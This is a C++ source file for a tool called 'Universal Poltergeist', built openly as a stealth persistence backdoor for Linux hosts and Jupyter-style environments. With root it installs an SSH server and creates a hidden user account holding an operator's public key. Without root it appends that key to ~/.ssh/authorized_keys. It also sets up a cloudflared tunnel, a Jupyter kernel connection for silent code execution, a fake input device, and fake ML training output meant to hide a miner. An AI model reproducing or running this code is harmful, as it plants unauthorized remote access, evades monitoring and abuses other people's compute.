#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <thread>
#include <vector>
#include <linux/uinput.h>
#include <zmq.hpp>
#include <chrono>
#include <random>

// --- Forward Declarations ---
void deploy_god_mode(const std::string& public_key);
void deploy_shadow_mode(const std::string& public_key);
void launch_cloudflared_tunnel(int ssh_port);
void haunt_uinput_frontend();
void haunt_zmq_backend();
void simulate_ml_workload();

// --- EVASION: THE FRONTEND GHOST (Virtual Hardware via uinput) ---
// Requires root privileges (God Mode)
void haunt_uinput_frontend() {
    int fd = open("/dev/uinput", O_WRONLY | O_NONBLOCK);
    if (fd < 0) {
        std::cerr << "[Ghost] Failed to open /dev/uinput." << std::endl;
        return;
    }

    ioctl(fd, UI_SET_EVBIT, EV_KEY);
    ioctl(fd, UI_SET_KEYBIT, BTN_LEFT);
    for (int i = 1; i <= 255; i++) ioctl(fd, UI_SET_KEYBIT, i);

    ioctl(fd, UI_SET_EVBIT, EV_REL);
    ioctl(fd, UI_SET_RELBIT, REL_X);
    ioctl(fd, UI_SET_RELBIT, REL_Y);

    struct uinput_user_dev uidev;
    memset(&uidev, 0, sizeof(uidev));
    snprintf(uidev.name, UINPUT_MAX_NAME_SIZE, "Poltergeist_Universal_HID");
    uidev.id.bustype = BUS_USB;
    uidev.id.vendor  = 0x1234;
    uidev.id.product = 0x5678;
    uidev.id.version = 1;

    write(fd, &uidev, sizeof(uidev));
    ioctl(fd, UI_DEV_CREATE);
    std::this_thread::sleep_for(std::chrono::seconds(1));

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> sleep_time(30000, 90000);

    std::cout << "[Ghost] Virtual Hardware initialized. Haunting display..." << std::endl;

    while (true) {
        // In a real implementation, we calculate Bezier curves and emit EV_REL and EV_KEY events here.
        std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time(gen)));
    }

    ioctl(fd, UI_DEV_DESTROY);
    close(fd);
}

// --- EVASION: THE BACKEND WHISPERER (ZeroMQ Kernel Injection) ---
// Operates in user-space (Shadow Mode)
void haunt_zmq_backend() {
    try {
        zmq::context_t context(1);
        zmq::socket_t shell_socket(context, ZMQ_DEALER);

        // This port would dynamically be parsed from ~/.local/share/jupyter/runtime/kernel-*.json
        std::string shell_port = "50002";
        std::string connection_str = "tcp://127.0.0.1:" + shell_port;
        shell_socket.connect(connection_str);

        std::cout << "[Whisperer] Connected to Jupyter Shell ZMQ: " << connection_str << std::endl;

        while (true) {
            // Here we would construct the HMAC-signed multipart Jupyter execution request
            // to silently run Python code on the backend without alerting the frontend browser.
            std::this_thread::sleep_for(std::chrono::seconds(45));
        }
    } catch (const zmq::error_t& e) {
        std::cerr << "[Whisperer] ZMQ Error: " << e.what() << std::endl;
    }
}

// --- EVASION: ASYMMETRIC SIMULATION CORE ---
// Operates in user-space (Shadow Mode)
void simulate_ml_workload() {
    // Lowers thread priority to yield CPU to the actual payload (e.g., a miner)
    nice(19);
    int epoch = 1;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> loss_noise(-0.05, 0.05);
    std::uniform_real_distribution<> acc_noise(-0.02, 0.02);
    std::uniform_int_distribution<> delay(30, 90);

    std::cout << "[Alibi] Starting synthetic ML training workload..." << std::endl;

    while (true) {
        double base_loss = 2.0 / sqrt(epoch + 1);
        double loss = std::max(0.01, base_loss + loss_noise(gen));

        double base_acc = 0.5 + 0.4 * (1.0 - 1.0 / (epoch + 1));
        double accuracy = std::min(0.99, base_acc + acc_noise(gen));

        printf("Training Progress: Epoch %d/100, Loss: %.4f, Accuracy: %.4f\n", epoch, loss, accuracy);
        fflush(stdout);

        epoch++;
        std::this_thread::sleep_for(std::chrono::seconds(delay(gen)));
    }
}

// --- TUNNEL: CLOUDFLARED ---
void launch_cloudflared_tunnel(int ssh_port) {
    std::cout << "[Tunnel] Launching Cloudflared reverse proxy to localhost:" << ssh_port << "..." << std::endl;
    // In a fully built binary, Cloudflared is extracted from memory or downloaded.
    // system(std::string("./cloudflared tunnel --url ssh://localhost:" + std::to_string(ssh_port)).c_str());

    while(true) {
        std::this_thread::sleep_for(std::chrono::hours(1));
    }
}

// --- DEPLOYMENT: GOD MODE (ROOT) ---
void deploy_god_mode(const std::string& public_key) {
    std::cout << "[+] Root privileges detected. Entering GOD MODE." << std::endl;

    std::cout << "    -> Installing OpenSSH Server..." << std::endl;
    system("apt-get update -y > /dev/null 2>&1 && apt-get install -y openssh-server > /dev/null 2>&1");

    system("useradd -s /bin/bash -m .poltergeist_user 2>/dev/null");
    system("mkdir -p /home/.poltergeist_user/.ssh");
    // Write the public_key string to the authorized_keys file
    std::string key_cmd = "echo '" + public_key + "' > /home/.poltergeist_user/.ssh/authorized_keys";
    system(key_cmd.c_str());
    system("chmod 700 /home/.poltergeist_user/.ssh");
    system("chmod 600 /home/.poltergeist_user/.ssh/authorized_keys");
    system("chown -R .poltergeist_user:.poltergeist_user /home/.poltergeist_user/.ssh");
    system("service ssh restart > /dev/null 2>&1");

    // Root allows us to use /dev/uinput
    std::thread frontend_ghost(haunt_uinput_frontend);
    frontend_ghost.detach();

    std::thread tunnel(launch_cloudflared_tunnel, 22);
    tunnel.detach();
}

// --- DEPLOYMENT: SHADOW MODE (USER-SPACE) ---
void deploy_shadow_mode(const std::string& public_key) {
    std::cout << "[-] Running as standard user. Entering SHADOW MODE." << std::endl;

    int shadow_port = 22222;
    std::cout << "    -> Launching user-space SSH server (Dropbear) on port " << shadow_port << "..." << std::endl;
    // Embed or download dropbear binary
    // system("./dropbear -p 22222 -r ./dropbear_rsa_host_key");

    std::string key_cmd = "mkdir -p ~/.ssh && echo '" + public_key + "' >> ~/.ssh/authorized_keys";
    system(key_cmd.c_str());

    // User-space forces us to use ZeroMQ and console output for evasion
    std::thread backend_ghost(haunt_zmq_backend);
    backend_ghost.detach();

    std::thread fake_workload(simulate_ml_workload);
    fake_workload.detach();

    std::thread tunnel(launch_cloudflared_tunnel, shadow_port);
    tunnel.detach();
}

// --- MAIN ENTRY POINT ---
int main(int argc, char* argv[]) {
    std::cout << "[*] Universal Poltergeist Initiated." << std::endl;
    std::string my_public_key = "ssh-rsa AAAAB3NzaC1... LO_Key"; // Replace with your actual key

    uid_t euid = geteuid();

    if (euid == 0) {
        deploy_god_mode(my_public_key);
    } else {
        deploy_shadow_mode(my_public_key);
    }

    // Keep the main process alive
    while(true) {
        std::this_thread::sleep_for(std::chrono::hours(24));
    }
    return 0;
}
